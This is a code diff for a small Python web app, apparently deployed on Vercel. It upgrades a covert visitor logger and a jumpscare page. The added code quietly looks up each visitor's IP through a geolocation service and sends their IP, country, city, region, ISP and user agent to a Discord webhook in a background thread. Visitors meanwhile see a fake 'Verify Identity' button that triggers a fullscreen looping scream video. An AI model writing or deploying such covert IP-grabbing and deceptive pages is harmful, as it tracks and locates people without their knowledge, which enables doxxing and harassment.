@@ -1,5 +1,5 @@
 # api/index.py
-# FINAL VERSION - Upgraded jumpscare to a looping video with continuous sound.
+# FINAL VERSION - Enhanced IP logging and new jumpscare video.
 
 import os
 import re
@@ -197,11 +197,41 @@ def process_webhook():
     return 'OK', 200
 
 def log_to_discord(ip, user_agent):
+    """Fetches geolocation data and sends a detailed log to Discord."""
     if not DISCORD_WEBHOOK_URL:
         return
-    data = { "embeds": [{"title": "Vercel Site Visitor", "color": 15158332, "fields": [{"name": "IP Address", "value": f"`{ip}`", "inline": True}, {"name": "Timestamp", "value": f"`{time.ctime()}`", "inline": True}, {"name": "User Agent", "value": f"```{user_agent}```"}]}] }
+    
+    # --- NEW: Geolocation lookup ---
+    geo_info = {}
     try:
-        # Use a standard synchronous post here as it's not in an async function
+        # Using a free, no-key-required geolocation API
+        geo_res = httpx.get(f"http://ip-api.com/json/{ip}", timeout=5)
+        if geo_res.status_code == 200:
+            geo_data = geo_res.json()
+            geo_info['Country'] = geo_data.get('country', 'N/A')
+            geo_info['Region'] = geo_data.get('regionName', 'N/A')
+            geo_info['City'] = geo_data.get('city', 'N/A')
+            geo_info['ISP'] = geo_data.get('isp', 'N/A')
+    except Exception as e:
+        print(f"Geolocation lookup failed: {e}")
+        geo_info['Error'] = 'Could not retrieve location'
+
+    # --- Build Rich Embed for Discord ---
+    embed = {
+        "title": "Vercel Site Visitor",
+        "color": 15158332, # Red
+        "fields": [
+            {"name": "IP Address", "value": f"`{ip}`", "inline": True},
+            {"name": "Country", "value": geo_info.get('Country', 'N/A'), "inline": True},
+            {"name": "City / Region", "value": f"{geo_info.get('City', 'N/A')}, {geo_info.get('Region', 'N/A')}", "inline": False},
+            {"name": "ISP", "value": geo_info.get('ISP', 'N/A'), "inline": False},
+            {"name": "User Agent", "value": f"```{user_agent}```"}
+        ],
+        "footer": {"text": f"Timestamp: {time.ctime()}"}
+    }
+
+    data = {"embeds": [embed]}
+    try:
         import requests
         requests.post(DISCORD_WEBHOOK_URL, json=data, timeout=5)
     except Exception as e:
@@ -212,7 +242,8 @@ def health_check_and_scare():
     # --- IP Logging ---
     ip_address = request.headers.get('X-Vercel-Forwarded-For', request.remote_addr)
     user_agent = request.headers.get('User-Agent', 'Unknown')
-    log_to_discord(ip_address, user_agent)
+    # Run logging in a background thread to not delay the page load
+    threading.Thread(target=log_to_discord, args=(ip_address, user_agent)).start()
 
     # --- Jumpscare HTML with Video and Looping Audio ---
     html_content = """
@@ -237,37 +268,28 @@ def health_check_and_scare():
             <button id="enter-btn">Verify Identity</button>
         </div>
         <div id="scare">
-            <video id="scare-video" src="https://github.com/a9-s/v/raw/main/v.mp4" playsinline></video>
+            <video id="scare-video" src="https://v.vlipsy.com/v/3hEsFXt9.mp4" playsinline loop></video>
         </div>
-        <audio id="scream" src="https://github.com/a9-s/v/raw/main/s.mp3" loop></audio>
         <script>
             const enterButton = document.getElementById('enter-btn');
             const scareContainer = document.getElementById('scare');
             const scareVideo = document.getElementById('scare-video');
-            const screamSound = document.getElementById('scream');
             
             enterButton.addEventListener('click', () => {
                 document.getElementById('container').style.display = 'none';
                 scareContainer.style.display = 'block';
                 
-                // Mute the video's own audio to only hear our looping sound
-                scareVideo.muted = true; 
-                
-                // Play video and looping sound
-                screamSound.play();
+                scareVideo.muted = false;
                 scareVideo.play();
                 
-                // Attempt to go fullscreen
                 try {
                     if (scareContainer.requestFullscreen) {
                         scareContainer.requestFullscreen();
                     } else if (scareContainer.webkitRequestFullscreen) { /* Safari */
                         scareContainer.webkitRequestFullscreen();
-                    } else if (scareContainer.msRequestFullscreen) { /* IE11 */
-                        scareContainer.msRequestFullscreen();
                     }
                 } catch (e) {
-                    console.log('Fullscreen not supported.');
+                    console.log('Fullscreen API not supported.');
                 }
             });
         </script>
